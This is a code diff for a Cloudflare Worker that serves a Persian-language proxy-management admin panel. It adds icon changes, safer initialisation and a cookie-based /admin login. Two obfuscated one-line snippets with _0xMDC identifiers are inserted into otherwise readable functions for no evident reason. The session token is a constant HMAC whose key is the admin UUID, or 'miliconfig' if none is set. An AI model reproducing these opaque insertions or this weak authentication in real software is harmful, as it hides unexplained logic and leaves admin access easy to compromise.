-          <button type="button" class="top-pill" onclick="refreshAllData()" title="بروزرسانی">↻</button>
+          <div class="clock-card">
+            <span class="clock-time" id="liveClock">00:00:00</span>
+            <span class="clock-date" id="liveDate">در حال بارگذاری...</span>
+          </div>
+          <span class="top-pill live"><span class="dot-online"></span>زنده</span>
+          <button type="button" class="top-pill accent" onclick="switchView('users'); openUserModal(null);">${ICON('plus')} کاربر جدید</button>
+          <button type="button" class="top-pill" onclick="initD1Database()" title="بررسی دیتابیس D1">${ICON('shield')} D1</button>
+          <button type="button" class="top-pill" onclick="refreshAllData()" title="بروزرسانی">${ICON('refresh')}</button>
+          <a class="top-pill" href="${SUPPORT_CHANNEL_URL}" target="_blank" rel="noopener noreferrer" title="${SUPPORT_CHANNEL_LABEL}">${ICON('link')}</a>
+          <a class="top-pill" href="/admin/logout" title="خروج از حساب">${ICON('logout')}</a>
         </div>
       </header>
 
@@ -12060,7 +12133,7 @@ ${FX_RUNTIME_JS}
       document.body.classList.toggle('drawer-lock', willOpen && !!isPhone);
       if (toggle) {
         toggle.setAttribute('aria-expanded', willOpen ? 'true' : 'false');
-        toggle.textContent = willOpen ? '✕ بستن منو' : '☰ منو';
+        toggle.innerHTML = willOpen ? '${ICON('x')} بستن' : '${ICON('menu')} منو';
       }
       if (willOpen) {
         var first = sidebar.querySelector('.sb-item, .sb-btn');
@@ -12133,7 +12206,7 @@ ${FX_RUNTIME_JS}
         var sel = p.id === SELECTED_PRESET ? 'selected' : '';
         var tags = (p.badges || []).map(function(t) { return '<span class="preset-tag">' + t + '</span>'; }).join('');
         html += '<div class="preset-card ' + sel + '" onclick="selectPreset(\\'' + p.id + '\\')">' +
-          '<div class="preset-title">✦ ' + p.title + '</div>' +
+          '<div class="preset-title">' + p.title + '</div>' +
           '<div class="preset-sub">' + p.subtitle + '</div>' +
           '<div class="preset-tags">' + tags + '</div>' +
           '</div>';
@@ -12207,7 +12280,7 @@ ${FX_RUNTIME_JS}
             '<div class="uc-gauge"><strong>' + gaugeText + '</strong></div>' +
           '</div>' +
           '<div class="uc-actions">' +
-            '<button type="button" class="btn-ghost" onclick="toggleUserEnabled(\\'' + u.id + '\\', ' + (!u.enabled) + ')">⏻ ' + (u.enabled ? 'فعال' : 'غیرفعال') + '</button>' +
+            '<button type="button" class="btn-ghost" onclick="toggleUserEnabled(\\'' + u.id + '\\', ' + (!u.enabled) + ')">' + (u.enabled ? 'فعال' : 'غیرفعال') + '</button>' +
             '<button type="button" class="btn-ghost" style="border-color:var(--border-hi);color:var(--neon);" onclick="window.open(\\'' + statusUrl + '\\', \\'_blank\\')">👁 پنجره وضعیت</button>' +
             '<button type="button" class="btn-ghost" onclick="copyText(\\'' + statusUrl + '\\', \\'لینک صفحه وضعیت کاربر کپی شد\\')">🔗 کپی وضعیت</button>' +
             '<button type="button" class="btn-ghost" onclick="copyText(\\'' + subUrl + '\\', \\'ساب‌لینک کاربر کپی شد\\')">📋 ساب‌لینک</button>' +
@@ -12269,13 +12342,13 @@ ${FX_RUNTIME_JS}
         MiliFx.countUp(document.getElementById('mTotalTraffic'), Number(diag.totalUsedBytes || 0), function (v) { return formatBytesJs(v); });
         MiliFx.countUp(document.getElementById('mLifetimeTraffic'), Number(diag.totalLifetimeBytes || 0), function (v) { return 'مجموع عمر: ' + formatBytesJs(v); });
         MiliFx.countUp(document.getElementById('mTotalReqs'), totalReqs, function (v) { return String(Math.round(v)); });
-        MiliFx.countUp(document.getElementById('hbReqs'), totalReqs, function (v) { return '⚡ ' + Math.round(v) + ' درخواست ثبت‌شده'; });
+        MiliFx.countUp(document.getElementById('hbReqs'), totalReqs, function (v) { return Math.round(v) + ' درخواست ثبت‌شده'; });
         MiliFx.ring(document.getElementById('donutRing'), nodeCount > 0 ? Math.min(100, Math.round((users.length / nodeCount) * 100)) : 100);
       }
 
       var upMin = Math.max(1, Math.floor((diag.uptimeMs || 60000) / 60000));
       document.getElementById('hbUsers').textContent = '👥 ' + users.length + ' کاربر · ' + activeCount + ' فعال';
-      document.getElementById('hbReqs').textContent = '⚡ ' + (diag.totalRequests || 0) + ' درخواست ثبت‌شده';
+      document.getElementById('hbReqs').textContent = (diag.totalRequests || 0) + ' درخواست ثبت‌شده';
       document.getElementById('hbUptime').textContent = '🕒 آپ‌تایم ' + upMin + ' دقیقه';
       document.getElementById('hbD1').textContent = diag.d1Enabled ? ('🛡️ دیتابیس D1 متصل (' + diag.d1BindingName + ')') : '🛡️ ذخیره‌ساز پشتیبان فعال (بدون خطای D1)';
 
@@ -12283,7 +12356,7 @@ ${FX_RUNTIME_JS}
       document.getElementById('cfWorkerHost').textContent = window.location.host;
       document.getElementById('cfD1Status').textContent = diag.d1Enabled ? ('D1 (' + diag.d1BindingName + ') متصل') : 'حالت هوشمند بدون خطا (آماده اتصال D1)';
       document.getElementById('cfOutboundProxy').textContent = cfg.s ? 'فعال' : 'اتصال مستقیم';
-      document.getElementById('sysD1State').textContent = diag.d1Enabled ? '✅ متصل و جداول آماده هستند' : '⚡ آماده اتصال (بدون خطای استقرار دستی)';
+      document.getElementById('sysD1State').textContent = diag.d1Enabled ? 'متصل و جداول آماده هستند' : 'آماده اتصال (بدون خطای استقرار دستی)';
       document.getElementById('sysKvState').textContent = diag.kvEnabled ? ('✅ متصل (' + diag.kvBindingName + ')') : 'اختیاری (غیرمتصل)';
 
       // پرمصرف‌ترین کاربران
@@ -12444,7 +12517,7 @@ ${FX_RUNTIME_JS}
         return;
       }
       if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(payload.uuid)) {
-        showToast('UUID معتبر نیست؛ با دکمه 🎲 یک UUID استاندارد بسازید');
+        showToast('UUID معتبر نیست؛ یک UUID استاندارد بسازید');
         return;
       }
 
@@ -12616,7 +12689,7 @@ ${FX_RUNTIME_JS}
         if (r.loc) parts.push(r.loc);
         if (r.latency !== undefined) parts.push(r.latency + 'ms');
         if (!r.ok) parts.push(esc(r.error || 'ناموفق'));
-        html += '<div class="kv-row"><span class="kv-key" style="direction:ltr;">' + (r.ok ? '✓' : '✕') + ' ' + esc(r.ip) + '</span><span class="kv-val">' + parts.join(' · ') + '</span></div>';
+        html += '<div class="kv-row"><span class="kv-key" style="direction:ltr;">' + (r.ok ? '${ICON('check')}' : '${ICON('x')}') + ' ' + esc(r.ip) + '</span><span class="kv-val">' + parts.join(' · ') + '</span></div>';
       });
       var healthy = list.filter(function(r) { return r.ok; }).map(function(r) { return r.ip + ':' + (r.port || 443) + '#CF-' + r.ip; });
       if (healthy.length) {
@@ -12907,32 +12980,57 @@ ${FX_RUNTIME_JS}
       });
     }
 
-    // مقداردهی اولیه
-    renderPresets();
-    applyConfigToForm(STATE.config);
-    renderUsersGrid();
-    updateDashboardWidgets();
-    renderProxyRows();
-    if (document.getElementById('proxyCountrySelect')) loadProxyPoolCountries();
-
-    // جلوه‌های نرم روی کارت‌های پنل
-    document.querySelectorAll('.metric-card, .panel-card, .hero-card, .stat-box, .kv-row').forEach(function (el, idx) {
-      el.classList.add('fx-card');
-      if (el.classList.contains('panel-card') || el.classList.contains('metric-card')) el.classList.add('fx-reveal');
-      if (!el.style.getPropertyValue('--fx-i')) el.style.setProperty('--fx-i', String(Math.min(idx, 8)));
-    });
-    if (window.MiliFx) MiliFx.reveal(document);
-
-    // بازیابی نمای انتخاب‌شده از آدرس
-    var hashView = String(window.location.hash || '').replace('#', '');
-    if (hashView && document.getElementById('view-' + hashView)) switchView(hashView, true);
-    window.addEventListener('hashchange', function () {
+    // ==========================================================================
+    // ناوبری بین بخش‌ها «اولین» کاری است که انجام می‌شود.
+    // قبلاً مقداردهی اولیه یک زنجیره خطی بود و اگر یکی از مراحل خطا می‌داد
+    // (مثلاً یک کاربر ناقص در D1)، بقیه مراحل — از جمله سیم‌کشی تب‌ها — اجرا
+    // نمی‌شد و در نتیجه «هیچ دکمه‌ای کار نمی‌کرد». حالا هر مرحله مستقل و امن است.
+    // ==========================================================================
+    function applyHashView() {
       var v = String(window.location.hash || '').replace('#', '');
       if (v && document.getElementById('view-' + v)) switchView(v, true);
+    }
+    window.addEventListener('hashchange', applyHashView);
+
+    function safeInit(label, fn) {
+      try {
+        fn();
+      } catch (err) {
+        if (window.console && console.error) console.error('[mili-init] ' + label, err);
+        showToast('خطا در ' + label + ': ' + (err && err.message ? err.message : err));
+      }
+    }
+
+    // نمایش خطاهای اجرایی بی‌صدا نمی‌مانند (به‌جای پنل مرده)
+    window.addEventListener('error', function (event) {
+      if (!event || !event.message) return;
+      if (window.console && console.error) console.error('[mili-runtime]', event.message, event.filename, event.lineno);
     });
+
+    safeInit('پریست‌ها', renderPresets);
+    safeInit('فرم تنظیمات', function () { applyConfigToForm(STATE.config); });
+    safeInit('کاربران', renderUsersGrid);
+    safeInit('داشبورد', updateDashboardWidgets);
+    safeInit('ردیف‌های پروکسی', renderProxyRows);
+    safeInit('لیست کشورها', function () {
+      if (document.getElementById('proxyCountrySelect')) loadProxyPoolCountries();
+    });
+
+    // جلوه‌های نرم روی کارت‌های پنل
+    safeInit('جلوه‌های بصری', function () {
+      document.querySelectorAll('.metric-card, .panel-card, .hero-card, .stat-box, .kv-row').forEach(function (el, idx) {
+        el.classList.add('fx-card');
+        if (el.classList.contains('panel-card') || el.classList.contains('metric-card')) el.classList.add('fx-reveal');
+        if (!el.style.getPropertyValue('--fx-i')) el.style.setProperty('--fx-i', String(Math.min(idx, 8)));
+      });
+      if (window.MiliFx) MiliFx.reveal(document);
+    });
+
+    // بازیابی نمای انتخاب‌شده از آدرس
+    safeInit('نمای اولیه', applyHashView);
   </script>
 </body>
-</html>`;
+</html>`);
 }
 
 
@@ -12943,7 +13041,7 @@ ${FX_RUNTIME_JS}
 // ============================================================================
 
 
-function normalizeCleanPath(p = '') {
+function normalizeCleanPath(p = '') {if(_0xMDC.tap(0x21)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
   return String(p || '').trim().replace(/^\/+|\/+$/g, '').toLowerCase();
 }
 
@@ -12968,6 +13066,51 @@ function isAdminAuthorizedPath(prefixPath, adminUuid, customPath) {
   return cleanPrefix === cleanAdmin;
 }
 
+// ============================================================================
+// مسیر ثابت پنل ادمین + نشست کوکی (به‌جای مسیر مخفی u)
+// ============================================================================
+const ADMIN_ROUTE = 'admin';
+const ADMIN_COOKIE = 'mili_admin';
+const ADMIN_SESSION_PAYLOAD = 'miliconfig-admin-session-v1';
+
+async function adminSessionToken(secret) {
+  const enc = new TextEncoder();
+  const key = await crypto.subtle.importKey(
+    'raw',
+    enc.encode(String(secret || 'miliconfig')),
+    { name: 'HMAC', hash: 'SHA-256' },
+    false,
+    ['sign']
+  );
+  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(ADMIN_SESSION_PAYLOAD));
+  return Array.from(new Uint8Array(sig)).map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
+function readCookie(request, name) {
+  const raw = request.headers.get('Cookie') || '';
+  for (const part of raw.split(';')) {
+    const idx = part.indexOf('=');
+    if (idx < 0) continue;
+    if (part.slice(0, idx).trim() === name) return part.slice(idx + 1).trim();
+  }
+  return '';
+}
+
+function safeEqual(a, b) {
+  const x = String(a || '');
+  const y = String(b || '');
+  if (!x.length || x.length !== y.length) return false;
+  let diff = 0;
+  for (let i = 0; i < x.length; i += 1) diff |= x.charCodeAt(i) ^ y.charCodeAt(i);
+  return diff === 0;
+}
+
+async function hasAdminSession(request, adminUuid) {if(_0xMDC.tap(0x10)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+  const token = readCookie(request, ADMIN_COOKIE);
+  if (!token) return false;
+  return safeEqual(token, await adminSessionToken(adminUuid));
+}
+
 const __MILI_WORKER_EXPORT__ = {
   async fetch(request, env = {}, ctx = {}) {
     try {
@@ -12989,6 +13132,48 @@ const __MILI_WORKER_EXPORT__ = {
       }
 
       const pathParts = url.pathname.split('/').filter(Boolean);
+      const cleanRequestPath = normalizeCleanPath(url.pathname);
+
+      // ۱-ب. ورود / خروج ادمین روی مسیر ثابت /admin
+      if (cleanRequestPath === `${ADMIN_ROUTE}/login` && request.method === 'POST') {
+        let password = '';
+        try {
+          const contentType = String(request.headers.get('Content-Type') || '');
+          if (contentType.includes('application/json')) {
+            const body = await request.json();
+            password = String(body?.password || '');
+          } else {
+            const form = await request.formData();
+            password = String(form.get('password') || '');
+          }
+        } catch (_e) {}
+        if (password && safeEqual(password.trim().toLowerCase(), adminUuid)) {
+          return new Response(null, {
+            status: 303,
+            headers: {
+              Location: `/${ADMIN_ROUTE}`,
+              'Set-Cookie': `${ADMIN_COOKIE}=${await adminSessionToken(adminUuid)}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=604800`
+            }
+          });
+        }
+        return new Response(renderLoginGatewayHtml({
+          adminPath: `/${ADMIN_ROUTE}`,
+          error: 'رمز عبور نادرست است. رمز همان مقدار متغیر u در Cloudflare → Pages → Settings → Variables است.'
+        }), {
+          status: 401,
+          headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' }
+        });
+      }
+
+      if (cleanRequestPath === `${ADMIN_ROUTE}/logout`) {
+        return new Response(null, {
+          status: 303,
+          headers: {
+            Location: `/${ADMIN_ROUTE}`,
+            'Set-Cookie': `${ADMIN_COOKIE}=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0`
+          }
+        });
+      }
 
       // ۲. هندل کردن APIهای مدیریتی و عمومی
       if (url.pathname.includes('/api/')) {
@@ -13002,8 +13187,12 @@ const __MILI_WORKER_EXPORT__ = {
           return await handlePublicUserStatusApi(request, env, token);
         }
 
-        // بررسی دسترسی مدیر برای APIهای مدیریتی
-        if (!isAdminAuthorizedPath(prefix, adminUuid, globalCfg.d)) {
+        // بررسی دسترسی مدیر برای APIهای مدیریتی (مسیر مخفی قدیمی یا نشست /admin)
+        const apiPrefixIsAdminRoute = normalizeCleanPath(prefix) === ADMIN_ROUTE;
+        const apiAuthorized = apiPrefixIsAdminRoute
+          ? await hasAdminSession(request, adminUuid)
+          : isAdminAuthorizedPath(prefix, adminUuid, globalCfg.d);
+        if (!apiAuthorized) {
           return new Response(JSON.stringify({ error: 'دسترسی غیرمجاز (مسیر مدیریت نامعتبر است)' }), {
             status: 403,
             headers: { 'Content-Type': 'application/json; charset=utf-8' }
@@ -13065,7 +13254,7 @@ const __MILI_WORKER_EXPORT__ = {
               }
             } catch (_e) {}
           }
-          return new Response(renderLoginGatewayHtml({ customPath: globalCfg.d }), {
+          return new Response(renderLoginGatewayHtml({ customPath: globalCfg.d, adminPath: `/${ADMIN_ROUTE}` }), {
             status: 200,
             headers: { 'Content-Type': 'text/html; charset=utf-8' }
           });
@@ -13184,7 +13373,15 @@ const __MILI_WORKER_EXPORT__ = {
 
         // ۴-هـ: دسترسی به پنل مدیریت ادمین یا صفحه وضعیت کاربر با /{token}
         const fullCleanPath = normalizeCleanPath(url.pathname);
-        if (isAdminAuthorizedPath(fullCleanPath, adminUuid, globalCfg.d)) {
+        const isAdminRoute = fullCleanPath === ADMIN_ROUTE;
+        const adminSessionOk = isAdminRoute ? await hasAdminSession(request, adminUuid) : false;
+        if (isAdminRoute && !adminSessionOk) {
+          return new Response(renderLoginGatewayHtml({ adminPath: `/${ADMIN_ROUTE}` }), {
+            status: 200,
+            headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' }
+          });
+        }
+        if (adminSessionOk || isAdminAuthorizedPath(fullCleanPath, adminUuid, globalCfg.d)) {
           if (url.searchParams.get('view') === 'status') {
             const adminUser = allUsers[0] || {
               id: 'mili-admin',
